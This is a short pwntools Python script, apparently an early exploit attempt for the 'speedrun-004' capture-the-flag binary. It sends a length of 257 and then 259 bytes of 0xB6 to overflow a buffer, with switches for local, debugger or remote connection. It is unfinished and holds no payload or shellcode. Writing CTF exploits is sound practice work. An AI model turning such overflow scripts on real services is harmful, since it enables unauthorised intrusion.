#!/usr/bin/env python3

from pwn import *

exe = ELF("./speedrun-004")

context.binary = exe

LOCAL=1
DEBUG=1

def conn():
    if LOCAL:
        if DEBUG:
            return gdb.debug([exe.path])
        else:
            return process([exe.path])
    else:
        return remote("addr", 31337)


SLEEP_DURATION = 0.2
def main():
    r = conn()
    print(r.recvuntil("how much do you have to say?"))
    sleep(SLEEP_DURATION)
    #r.send("257" + "\x00' * 6") # wants 9 bytes
    r.sendline("257") # wants 9 bytes
    sleep(SLEEP_DURATION)
    print(r.recvuntil("Ok, what do you have to say for yourself?"))
    sleep(SLEEP_DURATION)
    r.sendline(b"\xB6" * 259)
    sleep(SLEEP_DURATION)
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
